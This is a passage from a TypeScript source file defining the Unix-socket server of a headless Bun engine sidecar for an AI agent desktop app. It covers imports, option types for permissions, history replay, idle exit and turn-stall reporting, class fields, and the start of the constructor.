/**
 * The headless Bun engine sidecar's socket server.
 *
 * Responsibilities (TRANSPORT-DECISION.md §4, SECURITY-MINIMUM §2):
 *
 *  1. Accept a real `AppSessionController` (normal startup builds it through
 *     `createRuntimeBackedAppSession`; explicit P1-0 probes use the fixture
 *     adapter over the same controller seam).
 *  2. Listen on a Unix-domain socket (D6 pin 1 — a socket file, NOT stdio and
 *     NOT a child-IPC pipe, so the engine can outlive its control surface).
 *  3. Raw-forward every controller event to the client: ship the whole
 *     `AppSessionEvent` (incl. `event.message: SDKMessage`) without a lossy
 *     mapper. Clone-on-serialize (Landmine 2) + JSON-safe
 *     assert (Landmine 1) at the boundary.
 *  4. Validate every inbound frame with `appClientMessageSchema` and apply the
 *     T4/T6/T6b/T7 hardening before any effect.
 *
 * This module has ZERO `electron` imports — it runs under bare Bun. The
 * supervisor (also Electron-free) spawns it; Electron main is merely a client of
 * the supervisor.
 */

import { randomUUID } from 'crypto'
import { open } from 'node:fs/promises'
import z from 'zod/v4'
import type {
  AppSessionController,
  AppSessionPrompt,
} from '../../src/app-runtime/AppSessionController.js'
import { createMessageEvent } from '../../src/app-runtime/sessionEvents.js'
import type {
  AppPermissionRequest,
  AppPermissionResponse,
  AppSessionEvent,
} from '../../src/app-runtime/sessionEvents.js'
import type {
  SDKMessage,
  SDKUserMessage,
} from '../../src/entrypoints/agentSdkTypes.js'
import type { ToolPermissionContext, ToolPermissionRulesBySource } from '../../src/Tool.js'
import type { Message, MessageOrigin } from '../../src/types/message.js'
import type { QueuedCommand } from '../../src/types/textInputTypes.js'
import type { PermissionUpdate } from '../../src/types/permissions.js'
import {
  dequeue,
  dequeueAllMatching,
  enqueue,
  enqueuePendingNotification,
  getCommandQueueSnapshot,
  releaseTaskNotificationReservation,
  reserveTaskNotification,
  subscribeToCommandQueue,
} from '../../src/utils/messageQueueManager.js'
import { CROSS_SESSION_MESSAGE_TAG } from '../../src/constants/xml.js'
import { setCommandLifecycleListener } from '../../src/utils/commandLifecycle.js'
import { queuedCommandOrigin } from '../../src/utils/taskNotification.js'
import { toSDKMessageOriginProp } from '../../src/utils/messages/mappers.js'
import { permissionRuleValueFromString } from '../../src/utils/permissions/permissionRuleParser.js'
import { appClientMessageSchema } from '../../src/app-runtime/appSessionProtocol.js'
// C5 (P4-20) — the wire tool-name literal, imported from the ENGINE source the
// runtime mints permission requests with (appRuntimeCanUseTool.ts sets
// `tool_name: tool.name`), so the sidecar's tool gate can never drift from the
// real name. `prompt.js` is a constants-only module (no React graph).
import { ASK_USER_QUESTION_TOOL_NAME } from '../../src/tools/AskUserQuestionTool/prompt.js'
import type {
  AppClientMessage,
  AppSubmitMessage,
  AppSubmitPrompt,
  PermissionResponseMessage,
} from '../../src/app-runtime/appSessionProtocol.js'
import { parseThreadGoal } from '../../src/utils/threadGoal.js'
import { encodeFrame, FrameDecoder } from '../shared/framing.js'
import { mintDeliveryTrace, type DeliveryStage, type DeliveryTrace } from '../shared/deliveryTrace.js'
import {
  checkJsonSafe,
  omitUndefinedObjectProperties,
} from '../shared/jsonSafe.js'
import { scanForSecrets } from '../shared/secretGuard.js'
import {
  HOST_REQUEST_TIMEOUT_MS,
  MAX_ANSWER_QUESTIONS,
  MAX_FRAME_BYTES,
  MAX_FRAMES_PER_WINDOW,
  MAX_GENERATED_IMAGE_PREVIEW_BYTES,
  MAX_HISTORY_REPLAY_BYTES,
  MAX_HISTORY_REPLAY_FRAMES,
  MAX_OUTBOUND_FRAME_BYTES,
  MAX_PEER_TEXT_BYTES,
  MAX_PROMPT_BYTES,
  MAX_QUEUED_PROMPT_PREVIEW_CHARS,
  MAX_QUEUED_PROMPTS,
  MAX_QUESTION_ANSWER_CHARS,
  MAX_SUGGESTION_SELECTIONS,
  MAX_TEXT_FIELD_CHARS,
  RATE_WINDOW_MS,
} from '../shared/limits.js'
import {
  HISTORY_REPLAY_TRUNCATION_REQUEST_ID,
  PERMISSION_SET_MODE_MODES,
  PROMPT_FORCE_VERB_TYPES,
  PROMPT_RECALL_VERB_TYPES,
  PROTOCOL_VERSION,
  RUN_CONTROL_VERB_TYPES,
  SESSION_ACTION_VERB_TYPES,
  CONTEXT_BREAKDOWN_VERB_TYPES,
  HISTORY_LOAD_EARLIER_VERB_TYPES,
  TASK_CONTROL_VERB_TYPES,
  ACTIVITY_PRESENCES,
  HOST_REQUEST_ERROR_CODES,
  PEER_DELIVER_REFUSAL_REASONS,
  type AccountVerbMessage,
  type ActivityPresence,
  type AskUserQuestionAnswerMessage,
  type ClientFrame,
  type ErrorFrame,
  type HostRequestArgs,
  type HostRequestError,
  type HostRequestErrorCode,
  type HostRequestValues,
  type HostRequestVerb,
  type OAuthLoginProgress,
  type PermissionContextSnapshot,
  type QueuedPromptItem,
  type RecalledPrompt,
  type RemoteVerbMessage,
  type RunControlVerbMessage,
  type ServerFrame,
  type SessionActionResultFrame,
  type SessionActionVerbMessage,
  type SessionId,
  type SettingsVerbMessage,
  type SlashCatalogEntry,
  type TaskControlVerbMessage,
} from '../shared/protocol.js'
import {
  EDITABLE_SETTING_SOURCES,
  validateEditableSettingWrite,
} from '../shared/settingsEditable.js'
import {
  readEarlierDisplayHistory,
  type HistoryLoadEarlierReader,
} from './historyLoadEarlier.js'
import type { SidecarPermissionDomain } from './permissionDomain.js'
import type { SidecarSettingsDomain } from './settingsDomain.js'
import type { SidecarAgentConfigDomain } from './agentConfigDomain.js'
import type { SidecarGoalDomain } from './goalDomain.js'
import type { SidecarMemoryDomain } from './memoryDomain.js'
import type { SidecarTasksDomain } from './tasksDomain.js'
import type { SidecarAgentModeDomain } from './agentModeDomain.js'
import type { SidecarLeaseDomain } from './leaseDomain.js'
import type { SidecarPanelTaskReaper } from './panelTaskReaper.js'
import type {
  SidecarTaskControlDomain,
  TaskDismissResult,
} from './taskControlDomain.js'
import type { SidecarRunControlsDomain } from './runControlsDomain.js'
import type { SidecarSessionActionsDomain } from './sessionActionsDomain.js'
import type { SidecarContextBreakdownDomain } from './contextBreakdownDomain.js'
import type { ContextBreakdownSnapshot } from '../shared/protocol.js'
import {
  createSessionTitleGenerator,
  type SessionTitleDeps,
  type SessionTitleGenerator,
} from './sessionTitleGen.js'
import type { SidecarAccountsDomain } from './accountsDomain.js'
import type { SidecarWorkspaceTrustDomain } from './workspaceTrustDomain.js'
import type { SidecarDiagnosticsDomain } from './diagnosticsDomain.js'
import type { SidecarExtensionsDomain } from './extensionsDomain.js'
import type { SidecarRemoteSettingsDomain } from './remoteSettingsDomain.js'
import type { PermissionDisplayFacts } from './permissionDomain.js'
import { tryGetUsageStatsSnapshot } from './statsDomain.js'
import type { UsageStatsRange } from '../shared/protocol.js'

/**
 * Why an outbound frame was refused, one value per refusing site. Closed and
 * named for the mechanism so a drop record stays a metadata record: the frame's
 * own content is the thing that must not reach the diagnostics descriptor.
 */
export type OutboundDropReason =
  | 'clone_failed'
  | 'not_json_safe'
  | 'secret_key'
  | 'encode_failed'
  | 'oversize'

export type SidecarSocketLike = {
  write(data: Uint8Array, onFlushed?: () => void): void
  end(): void
}

/** A live client connection on the sidecar socket. */
type Connection = {
  socket: SidecarSocketLike
  decoder: FrameDecoder
  rateWindowStart: number
  rateCount: number
  /** Removed connections must not route late transport chunks into the engine. */
  closed: boolean
  deliveryConnectionEpoch: number
  /**
   * The oldest message THIS reader has already been sent as restored history,
   * and therefore the point its deeper read has to reach back from. Set from
   * the tail `sendHistoryReplay` actually put on this socket (which is what the
   * caps kept, not what was loaded), and moved further back by each successful
   * `history.loadEarlier` on this connection.
   *
   * Per CONNECTION, not per session: every attaching reader is replayed the
   * same original tail, so a session-wide anchor advanced by one reader would
   * leave the next one asking for a prefix it was never sent, and recovering
   * nothing. Null means this reader was sent no identifiable restored history,
   * so there is no anchor to diff a deeper read against.
   *
   * SUPERSEDED, when present, by the main-authored `viewAnchorUuid` on the
   * request frame: this field is what the socket SENT, which stops being what
   * the pane HOLDS once main's replay ring evicts or a renderer reload rebuilds
   * from it (HISTORY-LOAD-EARLIER.md §The view anchor).
   */
  loadEarlierAnchorUuid: string | null
  /** True once `sendHistoryReplay` put at least one frame on this socket. */
  loadEarlierReplayed: boolean
  /**
   * Latched when a deeper read reaches this reader's head. Later requests are
   * answered from the flag, so an already-whole transcript never pays another
   * 16 MiB read plus its subagent files. Per connection for the same reason the
   * anchor is: a reader that never recovered anything is not complete because
   * another one is.
   */
  loadEarlierComplete: boolean
}

/**
 * Quiet time inside a running turn before it is reported stalled. Long enough
 * that a slow tool or a long model response is not mistaken for a hang; the
 * 2026-08-10 turn was quiet for hours.
 */
export const DEFAULT_TURN_STALL_MS = 10 * 60 * 1000

/**
 * What this server can say about a turn without inferring anything: it holds
 * the active-turn flag, the clock, and whether the turn's `result` message has
 * come out of the engine yet. `phase` is populated from those and nothing else.
 */
export type SidecarTurnLifecycleEvent =
  | { kind: 'started' }
  | { kind: 'completed'; durationMs: number; outcome: 'ok' | 'failed' }
  | {
      kind: 'stalled'
      elapsedMs: number
      /**
       * `post_result` is the 2026-08-10 shape: the engine emitted its result and
       * the submit promise never settled, so the stall is on the post-turn path.
       * `awaiting_result` means the turn itself went quiet. `unknown` means no
       * engine event has been seen at all since the turn started, which is the
       * honest answer rather than a guess at which side is hung.
       */
      phase: 'awaiting_result' | 'post_result' | 'unknown'
    }

export type SidecarServerOptions = {
  sessionId: SessionId
  engineSessionId: string
  controller: AppSessionController
  /**
   * Optional socket-only wrapper. Production uses this to carry metadata-only
   * delivery identity without changing the raw `ServerFrame` schema observed by
   * server tests and other in-process consumers.
   */
  wrapOutboundFrame?: (frame: ServerFrame, trace: DeliveryTrace) => unknown
  /** Causal descriptor emitted at the actual sidecar boundary, never frame data. */
  onDeliveryStage?: (trace: DeliveryTrace, stage: Extract<DeliveryStage, 'engine.produced' | 'sidecar.received' | 'sidecar.socket.queued' | 'sidecar.socket.sent'>, frameKind: string) => void
  /**
   * A frame this server refuses to ship. The `log` lines below stay the live
   * debugging copy; this is the durable one, because stderr is inherited and
   * unpersisted (`app/supervisor/supervisor.ts`). Metadata only, per
   * decisions/OBSERVABILITY-MINIMUM.md §5.
   */
  onFrameDropped?: (reason: OutboundDropReason, frameKind: ServerFrame['kind']) => void
  /**
   * Turn lifecycle, the highest-value record the 2026-08-10 hang investigation
   * asked for (item A1). `started`/`completed` pair on every route; `stalled`
   * fires at most once per turn, after `turnStallMs` with no engine event, and
   * deliberately leaves the turn hung — killing it would destroy the state that
   * explains it (OBSERVABILITY-MINIMUM.md §3).
   */
  onTurnLifecycle?: (event: SidecarTurnLifecycleEvent) => void
  /** Quiet interval before a running turn is reported stalled. */
  turnStallMs?: number
  /**
   * Permissions domain capability (P2-4). Optional because the P1-0 probe
   * fixture has no engine app-state store; when absent, `permission.setMode`
   * fails closed and no `permission.context` snapshots are emitted.
   */
  permissions?: SidecarPermissionDomain
  /**
   * Settings read-seam (P4-3). Optional because the P1-0 probe fixture has no
   * cwd-configured engine; when absent, no `settings.snapshot` frame is emitted.
   */
  settings?: SidecarSettingsDomain
  /**
   * Agent config read-seam (P4-7). Optional because the P1-0 probe fixture has no
   * cwd-configured engine; when absent, no `agent-config.snapshot` frame is emitted.
   */
  agentConfig?: SidecarAgentConfigDomain
  /**
   * Goals read-seam (P4-10). Optional because the P1-0 probe fixture has no engine
   * app-state store; when absent, no `thread-goal.snapshot` frame is emitted.
   */
  goals?: SidecarGoalDomain
  /**
   * Memory read-seam (P4-10). Optional because the P1-0 probe fixture has no
   * cwd-configured engine; when absent, no `memory.snapshot` frame is emitted.
   */
  memory?: SidecarMemoryDomain
  /**
   * Tasks read-seam (P4-9). Optional because the P1-0 probe fixture has no engine
   * app-state store; when absent, no `tasks.snapshot` frame is emitted.
   */
  tasks?: SidecarTasksDomain
  /**
   * Agent-mode / Orchestrator read-seam (P4-8). When present, an
   * `agent-mode.snapshot` frame is emitted on attach and re-broadcast on store
   * change; when absent, no orchestrator frame is emitted.
   */
  agentMode?: SidecarAgentModeDomain
  /**
   * Codex lease read-seam (P4-32b, L1). When present, a `lease.snapshot` frame is
   * emitted on attach and re-broadcast on the same store change as agent-mode;
   * when absent, no lease frame is emitted. Outbound only, no lease verb.
   */
  leases?: SidecarLeaseDomain
  /**
   * Task-control write-seam (P4-8b) — the deferred worker Stop/kill verb. When
   * present, a `task.stop` verb dispatches the engine's own `stopTask`; when
   * absent, the verb fails closed (`internal_error`). Read-only, no snapshot of its
   * own — the kill's store mutation drives the `tasks`/`agent-mode` re-broadcasts.
   */
  taskControl?: SidecarTaskControlDomain
  /**
   * Terminal-worker eviction deadline owner. When present, it is started with the
   * server and stopped on `close()`, so a finished worker leaves `AppState.tasks`
   * at its `evictAfter` stamp instead of lingering on the docked roster; when
   * absent, terminal workers are only evicted on the next turn boundary.
   */
  panelTaskReaper?: SidecarPanelTaskReaper
  /**
   * Composer run-controls read-seam + write verbs (P4-24c). When present, a
   * `run-controls.snapshot` frame is emitted on attach and re-broadcast on the
   * store change a `model.set`/`effort.set`/`fast.set` verb causes; when absent,
   * no run-controls frame is emitted and the verbs fail closed.
   */
  runControls?: SidecarRunControlsDomain
  /**
   * Session-action write verbs over the engine's own persistence and live
   * conversation controller. Optional because the P1-0 probe fixture has no
   * engine; when absent, the verbs fail closed with an internal_error.
   */
  sessionActions?: SidecarSessionActionsDomain
  /**
   * Context-breakdown read-seam — the per-category occupancy behind the composer
   * donut's popover. Optional because the P1-0 probe fixture has no engine; when
   * absent, no `context-breakdown.snapshot` frame is emitted and the popover
   * renders its aggregate row alone.
   */
  contextBreakdown?: SidecarContextBreakdownDomain
  /**
   * Accounts read-seam + lifecycle verbs (P4-5). Optional because the P1-0 probe
   * fixture has no engine; when absent, no `accounts.snapshot` frame is emitted
   * and account verbs fail closed.
   */
  accounts?: SidecarAccountsDomain
  /**
   * Workspace-trust read-seam (P4-14). Optional because the P1-0 probe fixture
   * has no cwd-configured engine; when absent, no `workspace-trust.snapshot`
   * frame is emitted.
   */
  workspaceTrust?: SidecarWorkspaceTrustDomain
  /**
   * Diagnostics read-seam (P4-14). Optional because the P1-0 probe fixture has
   * no cwd-configured engine; when absent, no `diagnostics.snapshot` frame is
   * emitted.
   */
  diagnostics?: SidecarDiagnosticsDomain
  /**
   * Settings extensions read-seam (P4-12). Optional because the P1-0 probe fixture
   * has no cwd-configured engine; when absent, no `extensions.snapshot` is emitted.
   */
  extensions?: SidecarExtensionsDomain
  /**
   * RemoteSettings read-seam + verbs (P4-13, D3 cut scope). Optional because the
   * P1-0 probe fixture has no engine app-state store or cwd-configured command
   * catalog; when absent, no `remoteSettings.snapshot` frame is emitted and
   * RemoteSettings verbs fail closed.
   */
  remoteSettings?: SidecarRemoteSettingsDomain
  /**
   * The session's user-invocable slash commands WITH display metadata (name +
   * description + optional arg hint), built at spawn from the sidecar's
   * `getCommands` catalog (`sessionController.ts`). Sent to each attaching
   * connection on connect as a read-only `slash-catalog.snapshot`, so the composer
   * picker renders rich rows (prototype parity) before the first turn — the engine
   * otherwise ships names-only on the per-turn `system/init.slash_commands`
   * (`QueryEngine.ts:598`). Spawn-frozen, so never re-broadcast. Absent in probe
   * mode / when the catalog load degraded to empty.
   */
  slashCatalog?: readonly SlashCatalogEntry[]
  /**
   * Restored-session display history (F2 — decisions/RESTORE-HISTORY.md): an
   * archival prefix followed by the exact visible projection of the engine's
   * compacted seed. Replayed to each attaching connection as `replay: true`
   * event frames after `ready`, capped + truncation-signalled. Absent for fresh
   * sessions.
   */
  history?: readonly SDKMessage[]
  /** Display loader omitted an older archival prefix before wire capping. */
  historySourceTruncated?: boolean
  /**
   * Rebuild the marker-aware display transcript from a retained engine seed.
   * Production supplies the same projector used during initial resume.
   */
  projectHistory?: (
    retainedMessages: Message[],
  ) => Promise<{ history: SDKMessage[]; truncated: boolean }>
  /**
   * The deeper transcript read behind `history.loadEarlier`
   * (decisions/HISTORY-LOAD-EARLIER.md). Defaults to the REAL engine-backed
   * reader (`historyLoadEarlier.ts`), so production never has to remember to
   * wire it and a stubbed one is only ever a deliberate test choice. It takes no
   * arguments on purpose: the transcript is resolved from the engine's own live
   * session identity, never from frame content.
   */
  loadEarlierHistory?: HistoryLoadEarlierReader
  /** True when resume detected a turn that ended before an assistant response. */
  turnInterrupted?: boolean
  /**
   * Idle self-exit TTL in ms (CC-3, docs O1 / SESSION-LIFETIME §2). When no
   * supervisor connection has been active for this long, `onIdle` fires so the
   * process can self-terminate — bounding the lifetime of a host-crash orphan,
   * which otherwise has no reaper until the next app launch (and none at all if
   * its registry row is evicted first). This is an ADDITIVE time-based self-exit,
   * NOT parent-binding (SESSION-LIFETIME L2): the sidecar decides on elapsed idle,
   * never on a parent channel — die-with-window stays supervisor behavior. A live
   * connection cancels the timer; the first disconnect (or construction with zero
   * connections) starts it. `undefined`/`<= 0` disables the timer.
   */
  idleTtlMs?: number
  /**
   * Fires when `idleTtlMs` elapses with zero active connections. `index.ts`
   * passes cleanup()+`process.exit(0)`; tests pass a spy. Never called while a
   * connection is open (a live connection clears the timer). Absent ⇒ the timer
   * is never armed regardless of `idleTtlMs`.
   */
  onIdle?: () => void
  /**
   * IDLE-PARK (decisions/IDLE-PARK.md §2/§3) — fires when an `app.park` frame
   * passes the park gate (no active turn, no pending permission, no running/
   * pending task) and the parking latch is set. `index.ts` passes
   * cleanup()+`process.exit(PARKED_EXIT_CODE)`; tests pass a spy. Absent ⇒ park
   * is not wired (e.g. the probe fixture) and every `app.park` is declined —
   * there is nothing to exit, so latching would only wedge the session.
   */
  onPark?: () => void
  /**
   * P4-6 title-rider: true when this session was resumed (has restored history).
   * A resumed session already carries its title and history, so its first turn
   * this run is a continuation — retitling it from that prompt would mislabel it.
   * The title generator skips generation entirely when set. Defaults to false.
   */
  resumed?: boolean
  /**
   * P4-6 title-rider: override the engine title deps in tests (generate / existing-
   * title check / persist). Absent ⇒ `realSessionTitleDeps` (the TUI machinery),
   * so production never injects and a test never needs the Haiku round-trip.
   */
  titleDeps?: SessionTitleDeps
  /** Test seam for the live generated-image preview read. */
  readGeneratedImage?: (filePath: string) => Promise<Uint8Array | null>
  /** Test seam for targeted session-action result sizing. */
  sessionActionResultMaxBytes?: number
  /** Structured logger; defaults to stderr. Never logs secrets. */
  log?: (line: string) => void
}

/**
 * Which server currently holds the engine's single-slot command-lifecycle
 * listener (D1a). Module-scoped because the slot itself is module-scoped in the
 * engine: without this, a second server's `close()` would silently disarm a
 * live one.
 */
let commandLifecycleOwner: SidecarServer | null = null

/**
 * The published-key value for "nothing is waiting" (D1a). A session starts here
 * rather than at `null`, because `null` is a state no snapshot can ever equal:
 * the first unrelated queue event of the session would read as a change and
 * publish an empty list, which is precisely the frame the attach path suppresses
 * as noise.
 */
const EMPTY_QUEUED_PROMPTS_KEY = JSON.stringify([])

/**
 * Wires a controller to a connection-handling façade. The transport (Bun's
 * `Bun.listen({ unix })`) is created by the caller and delivers raw byte chunks
 * to `handleData`; this class owns framing, validation, and forwarding. Keeping
 * the transport injectable makes the security logic unit-testable without a real
 * socket.
 */
export class SidecarServer {
  private readonly sessionId: SessionId
  private readonly engineSessionId: string
  private readonly controller: AppSessionController
  private readonly permissions: SidecarPermissionDomain | null
  private readonly settings: SidecarSettingsDomain | null
  private readonly agentConfig: SidecarAgentConfigDomain | null
  private readonly goals: SidecarGoalDomain | null
  private readonly memory: SidecarMemoryDomain | null
  private readonly tasks: SidecarTasksDomain | null
  private readonly agentMode: SidecarAgentModeDomain | null
  private readonly leases: SidecarLeaseDomain | null
  private readonly taskControl: SidecarTaskControlDomain | null
  private readonly panelTaskReaper: SidecarPanelTaskReaper | null
  private readonly runControls: SidecarRunControlsDomain | null
  private readonly sessionActions: SidecarSessionActionsDomain | null
  private readonly contextBreakdown: SidecarContextBreakdownDomain | null
  /** Serialises the (transcript-reading, tokenizing) breakdown analysis. */
  private contextBreakdownInFlight = false
  /** A trigger that arrived mid-analysis, re-run once the current one settles. */
  private contextBreakdownPending = false
  /** When the last analysis completed, for the freshness floor below. */
  private contextBreakdownComputedAt = 0
  /** The last snapshot, re-broadcast instead of recomputing inside the floor. */
  private contextBreakdownLast: ContextBreakdownSnapshot | null = null
  private readonly accounts: SidecarAccountsDomain | null
  private readonly workspaceTrust: SidecarWorkspaceTrustDomain | null
  private readonly diagnostics: SidecarDiagnosticsDomain | null
  private readonly extensions: SidecarExtensionsDomain | null
  private readonly remoteSettings: SidecarRemoteSettingsDomain | null
  private readonly slashCatalog: readonly SlashCatalogEntry[]
  private history: readonly SDKMessage[]
  private historySourceTruncated: boolean
  private readonly projectHistory: ((
    retainedMessages: Message[],
  ) => Promise<{ history: SDKMessage[]; truncated: boolean }>) | null
  private readonly loadEarlierHistory: HistoryLoadEarlierReader
  /**
   * One deeper read per session at a time (decisions/HISTORY-LOAD-EARLIER.md
   * §Bounds). Enforced HERE and not in the renderer's disabled control, per
   * SECURITY-MINIMUM R2: renderer-side checks are UX, never the boundary.
   */
  private loadEarlierInFlight = false
  private readonly turnInterrupted: boolean
  private readonly idleTtlMs: number
  private readonly onIdle: (() => void) | null
  /** IDLE-PARK — the gated self-exit closure (null ⇒ park unwired, see options). */
  private readonly onPark: (() => void) | null
  /** P4-6 title-rider — the one-shot AI-title generator for this session. */
  private readonly titleGenerator: SessionTitleGenerator
  private readonly readGeneratedImage: (
    filePath: string,
  ) => Promise<Uint8Array | null>
  private readonly sessionActionResultMaxBytes: number
  private readonly generatedImageToolUseIds = new Set<string>()
  private readonly log: (line: string) => void
  private readonly wrapOutboundFrame: ((frame: ServerFrame, trace: DeliveryTrace) => unknown) | null
  private readonly onDeliveryStage: ((trace: DeliveryTrace, stage: Extract<DeliveryStage, 'engine.produced' | 'sidecar.received' | 'sidecar.socket.queued' | 'sidecar.socket.sent'>, frameKind: string) => void) | null
  private readonly onFrameDropped: ((reason: OutboundDropReason, frameKind: ServerFrame['kind']) => void) | null
  private readonly onTurnLifecycle: ((event: SidecarTurnLifecycleEvent) => void) | null
  private readonly turnStallMs: number
  /** Turn-scoped stall state; all of it is reset by the next `startTurn`. */
  private turnStartedAtMs = 0
  private turnLastEventAtMs = 0
  private turnEventCount = 0
  private turnResultSeen = false
  private turnResultFailed = false
  private turnStallReported = false
  private turnStallTimer: ReturnType<typeof setTimeout> | null = null
  private readonly deliveryStreamEpoch = randomUUID()
  private readonly deliveryProcessInstanceId = randomUUID()
  private deliverySequence = 0
  private deliveryConnectionEpoch = 0
  private readonly connections = new Set<Connection>()
  private unsubscribe: (() => void) | null = null
  private unsubscribePermissionContext: (() => void) | null = null
  private unsubscribeGoalSnapshot: (() => void) | null = null
  private unsubscribeMemorySnapshot: (() => void) | null = null
  private unsubscribeTasksSnapshot: (() => void) | null = null
  private unsubscribeAgentModeSnapshot: (() => void) | null = null
  private unsubscribeLeaseSnapshot: (() => void) | null = null
  private unsubscribeRunControlsSnapshot: (() => void) | null = null
  private unsubscribeTaskNotificationQueue: (() => void) | null = null
  private stopPanelTaskReaper: (() => void) | null = null
  private activeTurn = false
  /** Queue listeners are synchronous; drain only from a later microtask. */
  private taskNotificationDrainScheduled = false
  /** Set before unsubscription so an already-scheduled queue microtask is inert. */
  private closed = false
  /** A non-QueryEngine adapter completed without durable-input acknowledgement. */
  private taskNotificationAwaitingDurableAcceptance = false
  /**
   * HOST-REQUEST-PLANE §5 — the request client's in-flight table. One entry per
   * `host.request` this sidecar has sent and not yet had answered, keyed by the
   * `requestId` IT minted. A `host.result` whose id matches nothing here is
   * dropped and logged (§2); a request that times out is settled with a typed
   * failure and its entry removed, so nothing here can grow without bound and no
   * caller can hang.
   */
  private readonly pendingHostRequests = new Map<
    string,
    {
      settle: (result: HostRequestOutcome<HostRequestVerb>) => void
      timer: ReturnType<typeof setTimeout>
      /** The verb's own value schema, so the result is validated per verb (HR5). */
      valueSchema: z.ZodType
    }
  >()
  /**
   * The last `activity` presence published, so a recomputation that lands on the
   * same answer costs no frame. `null` means nothing has been published yet,
   * which is only true before the first attach.
   */
  private lastPublishedPresence: ActivityPresence | null = null
  /**
   * Queued prompts already requeued once after a turn refused them. Bounds the
   * boundary-drain retry to one attempt per prompt; entries are removed as soon
   * as a turn durably accepts the prompt, so this only ever holds failures.
   */
  private readonly retriedQueuedPromptKeys = new Set<string>()
  /**
   * D1a — messages sent mid-turn that are waiting for the running response and
   * have NOT been announced to the transcript yet, keyed by the uuid they will
   * carry when they are. Holding the prompt here (rather than reading it back
   * off the queue) is what lets the commit happen from the engine's consumption
   * signal, which reports a uuid and nothing else.
   *
   * Exactly one path removes an entry, and each removal announces the message:
   * the engine consuming it mid-turn (the lifecycle listener below), or
   * `drainOneQueuedPrompt` starting a turn of its own for it. A staged row is
   * additionally intersected with the LIVE queue when the snapshot is built, so
   * a row cannot outlive the message even if a future path drops a command
   * without telling this map.
   */
  private readonly stagedPrompts = new Map<
    string,
    { prompt: AppSubmitPrompt; isMeta?: boolean }
  >()
  /** Last staged list actually published, for `broadcastQueuedPrompts`. */
  private lastQueuedPromptsKey: string = EMPTY_QUEUED_PROMPTS_KEY
  /**
   * D1b — staged messages a recall took off the queue, kept only so a LATE
   * delivery signal can still write their transcript row.
   *
   * The window is real: the engine snapshots the queue, awaits, and only then
   * fires `notifyCommandLifecycle` + `removeFromQueue` (`src/query.ts:1768` →
   * `:1842`). A recall inside it removes a command the model has already been
   * given. If recall simply forgot the message, the delivery signal that arrives
   * a moment later would find nothing staged and the transcript would never show
   * a message the model received — the exact inverse of the bug D1a fixed, and
   * just as silent.
   *
   * Carries the recall's `requestId` so the correction can be addressed to the
   * answer the user already saw: this branch is the ONLY place the race is
   * observable, so it is where the "it went anyway" result comes from.
   *
   * Bounded by `MAX_QUEUED_PROMPTS` with oldest-out eviction, and cleared when
   * the running turn ends: no delivery signal for these uuids can arrive after
   * that, so an entry that survives it is dead weight holding a full prompt.
   */
  private readonly recalledPrompts = new Map<
    string,
    { prompt: AppSubmitPrompt; isMeta?: boolean; requestId: string }
  >()
  /**
   * D1b — how many of ONE recall's messages turned out to have been delivered,
   * accumulated per recall requestId until the microtask below reports them.
   *
   * The engine signals consumption one uuid at a time, in a synchronous loop
   * (`src/query.ts:1836-1842`), so a recall of three messages that all went
   * anyway produced three corrections, each of them claiming exactly one message.
   * The user read three contradictory statements about one action, and none of
   * them was the true count. Coalescing on the microtask boundary is what makes
   * the correction one true statement: the whole loop has run by then.
   */
  private readonly lateRecallDeliveries = new Map<string, number>()
  private lateRecallFlushScheduled = false
  /**
   * IDLE-PARK (decisions/IDLE-PARK.md §3, R2-F2) — the parking latch. Set
   * synchronously in `handlePark` once the gate passes; a submit arriving AFTER
   * the latch is rejected `session_disconnected` before `activeTurn` is touched,
   * so the turn never starts (no turn loss). One-way per process: a latched
   * sidecar is exiting.
   */
  private parking = false
  /** Serializes conversation rewinds/forks and fail-closes submit during mutation. */
  private conversationMutationInFlight = false
  /**
   * IDLE-PARK — count of accepted verbs whose DURABLE write is still in flight
   * (account ops, session actions). The turn/permission/task gates below see
   * none of these: they are dispatched fire-and-forget, and several of them
   * (vault token refresh, fork transcript write) leave a lockfile or a
   * half-written file behind if the process exits mid-flight. Incremented
   * synchronously at dispatch, decremented when the promise settles.
   */
  private inFlightDurableWrites = 0
  /** One-shot guard for the wham/usage populate (accounts snapshot). */
  private usageRefreshStarted = false
  /** Latest agent snapshot publication requested for each attached connection. */
  private agentModeSnapshotGeneration = 0
  private readonly agentModeSnapshotGenerationByConnection =
    new WeakMap<Connection, number>()
  /** Armed while zero connections are open; cleared on connect/close (CC-3). */
  private idleTimer: ReturnType<typeof setTimeout> | null = null

  constructor(options: SidecarServerOptions) {
    this.sessionId = options.sessionId
    this.engineSessionId = options.engineSessionId
    this.controller = options.controller
    this.permissions = options.permissions ?? null
    this.settings = options.settings ?? null
    this.agentConfig = options.agentConfig ?? null
    this.goals = options.goals ?? null
    this.memory = options.memory ?? null
    this.tasks = options.tasks ?? null
    this.agentMode = options.agentMode ?? null
    this.leases = options.leases ?? null
    this.taskControl = options.taskControl ?? null
    this.panelTaskReaper = options.panelTaskReaper ?? null
    this.runControls = options.runControls ?? null
    this.sessionActions = options.sessionActions ?? null
    this.contextBreakdown = options.contextBreakdown ?? null
    this.accounts = options.accounts ?? null
    // P4-15 — the OAuth login controller pushes progress through this sink; the
    // server frames it as an `oauth.login.progress` broadcast (and re-broadcasts
    // the accounts snapshot on `success`, so a completed login clears the
    // first-run surface / reauth banner). The domain keeps ZERO transport
    // knowledge — it emits an `OAuthLoginProgress`, the server owns framing.
    this.accounts?.setOAuthProgressSink(progress =>
      this.broadcastOAuthLoginProgress(progress),
    )
    this.workspaceTrust = options.workspaceTrust ?? null
    this.diagnostics = options.diagnostics ?? null
    this.extensions = options.extensions ?? null
    this.remoteSettings = options.remoteSettings ?? null
    this.slashCatalog = options.slashCatalog ?? []
    this.history = options.history ?? []
    this.historySourceTruncated = options.historySourceTruncated ?? false
    this.projectHistory = options.projectHistory ?? null
    this.loadEarlierHistory =
      options.loadEarlierHistory ?? readEarlierDisplayHistory
    this.turnInterrupted = options.turnInterrupted ?? false
    this.idleTtlMs = options.idleTtlMs ?? 0
    this.onIdle = options.onIdle ?? null
    this.onPark = options.onPark ?? null
    this.titleGenerator = createSessionTitleGenerator({
      engineSessionId: this.engineSessionId,
      resumed: options.resumed ?? false,
      ...(options.titleDeps ? { deps: options.titleDeps } : {}),
    })
    this.readGeneratedImage =
      options.readGeneratedImage ?? readGeneratedImageForPreview
    this.sessionActionResultMaxBytes =
      options.sessionActionResultMaxBytes ?? MAX_OUTBOUND_FRAME_BYTES
    this.log = options.log ?? (line => process.stderr.write(`${line}\n`))
    this.wrapOutboundFrame = options.wrapOutboundFrame ?? null
